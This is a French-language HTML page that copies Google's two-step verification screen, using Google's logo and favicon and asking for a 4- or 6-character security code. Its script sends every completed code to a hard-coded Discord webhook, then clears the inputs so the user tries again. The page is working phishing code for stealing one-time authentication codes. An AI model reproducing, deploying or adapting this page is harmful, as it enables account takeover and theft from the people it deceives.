<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Vérification en deux étapes</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" />
  <style>
    body {
      font-family: Roboto, Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      background: white;
      padding: 40px 30px 50px 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 360px;
      max-width: 100%;
      text-align: center;
    }
    .google-logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-weight: 400;
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #555;
      margin-bottom: 25px;
    }
    .input-group {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 25px;
      flex-wrap: wrap;
    }
    input.code-input {
      width: 48px;
      height: 56px;
      font-size: 32px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 6px;
      outline-offset: 2px;
      transition: border-color 0.3s;
      user-select: none;
    }
    input.code-input:focus {
      border-color: #4285f4;
      box-shadow: 0 0 5px #4285f4;
    }
    label {
      font-size: 14px;
      display: block;
      margin-bottom: 12px;
      color: #333;
      cursor: pointer;
    }
    .footer {
      font-size: 12px;
      color: #999;
      margin-top: 15px;
    }
    select {
      padding: 6px 10px;
      font-size: 14px;
      border-radius: 4px;
      border: 1px solid #ccc;
      margin-bottom: 25px;
      cursor: pointer;
    }

    /* Responsive pour téléphone */
    @media (max-width: 480px) {
      .container {
        padding: 30px 15px 40px 15px;
        width: 100%;
      }
      input.code-input {
        width: 42px;
        height: 50px;
        font-size: 28px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img
      src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
      class="google-logo"
      alt="Google"
    />
    <h1>Vérification en deux étapes</h1>
    <p>Entrez le code de sécurité</p>

    <label for="lengthSelect">Longueur du code :</label>
    <select id="lengthSelect" aria-label="Longueur du code">
      <option value="4">4 caractères</option>
      <option value="6" selected>6 caractères</option>
    </select>

    <div class="input-group" id="codeInputs">
      <!-- Inputs générés ici -->
    </div>

    <div class="footer">Ce code expire dans 10 minutes</div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1399331411558797363/L-4Sn5hwtib-iQQei_gP1pPrCqf0jRYWiridji5jA2sGajdEdCzIX1uymbsWIEunmUWs";
    const lengthSelect = document.getElementById("lengthSelect");
    const codeInputsDiv = document.getElementById("codeInputs");

    function createInputs(length) {
      codeInputsDiv.innerHTML = "";
      for (let i = 0; i < length; i++) {
        const input = document.createElement("input");
        input.type = "text";
        input.maxLength = 1;
        input.className = "code-input";
        input.autocomplete = "off";
        input.inputMode = "text";
        input.setAttribute("aria-label", `Caractère ${i + 1}`);
        input.addEventListener("input", onInput);
        input.addEventListener("keydown", onKeyDown);
        codeInputsDiv.appendChild(input);
      }
      codeInputsDiv.firstChild.focus();
    }

    function onInput(e) {
      const input = e.target;
      const val = input.value;
      if (val.length > 1) {
        input.value = val.slice(0, 1);
      }
      const next = input.nextElementSibling;
      if (val && next) {
        next.focus();
      }
      checkAndSend();
    }

    function onKeyDown(e) {
      const input = e.target;
      if (e.key === "Backspace" && !input.value) {
        const prev = input.previousElementSibling;
        if (prev) {
          prev.focus();
        }
      } else if (e.key === "ArrowLeft") {
        const prev = input.previousElementSibling;
        if (prev) prev.focus();
      } else if (e.key === "ArrowRight") {
        const next = input.nextElementSibling;
        if (next) next.focus();
      }
    }

    function checkAndSend() {
      const inputs = [...codeInputsDiv.querySelectorAll("input")];
      if (inputs.every(input => input.value.length === 1)) {
        const code = inputs.map(input => input.value).join("");
        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: `Code reçu : ${code}` })
        }).catch(() => {});
        inputs.forEach(input => (input.value = ""));
        inputs[0].focus();
      }
    }

    lengthSelect.addEventListener("change", () => {
      createInputs(parseInt(lengthSelect.value, 10));
    });

    createInputs(parseInt(lengthSelect.value, 10));
  </script>
</body>
</html>
